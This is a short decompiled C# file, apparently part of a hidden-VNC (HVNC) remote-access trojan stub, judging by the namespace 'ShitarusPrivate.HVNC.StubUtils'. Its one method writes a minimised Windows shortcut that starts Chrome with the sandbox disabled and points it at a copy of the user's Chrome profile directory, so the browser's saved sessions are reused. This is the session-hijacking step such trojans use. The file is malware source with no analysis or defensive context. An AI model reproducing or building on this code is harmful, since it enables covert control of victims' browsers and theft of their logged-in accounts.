using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using ShitarusPrivate.IWshRuntimeLibrary;

namespace ShitarusPrivate.HVNC.StubUtils
{
    internal class ink
    {
        [CompilerGenerated]
        private static class __o__0
        {
            public static CallSite<Func<CallSite, object, IWshShortcut>> __p__0;
        }

        public static void CreateShortcut(string icon, string shortcutName, string description)
        {
            string directoryName = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
            string text = Path.Combine(directoryName, shortcutName + ".lnk");
            if (!Directory.Exists(directoryName))
            {
                Directory.CreateDirectory(directoryName);
            }
            if (File.Exists(text))
            {
                File.Delete(text);
            }
            new List<string>().Add(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
            string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
            string targetPath = Path.Combine(folderPath, "Google\\Chrome\\Application\\chrome.exe");
            string environmentVariable = Environment.GetEnvironmentVariable("LocalAppData");
            environmentVariable = Path.Combine(environmentVariable, "Google\\Chrome");
            string text2 = environmentVariable;
            text2 = Path.Combine(environmentVariable, "Chrome");
            Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86);
            WshShell wshShell = (WshShell)Activator.CreateInstance(Marshal.GetTypeFromCLSID(new Guid("72C24DD5-D70A-438B-8A42-98424B88AFB8")));
            IWshShortcut wshShortcut = (IWshShortcut)(dynamic)wshShell.CreateShortcut(text);
            wshShortcut.TargetPath = targetPath;
            wshShortcut.Arguments = "  --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --restore-last-session --user-data-dir=" + text2;
            wshShortcut.Description = description;
            wshShortcut.Hotkey = "Ctrl+A";
            wshShortcut.IconLocation = icon;
            wshShortcut.WindowStyle = 7;
            wshShortcut.Save();
        }
    }
}
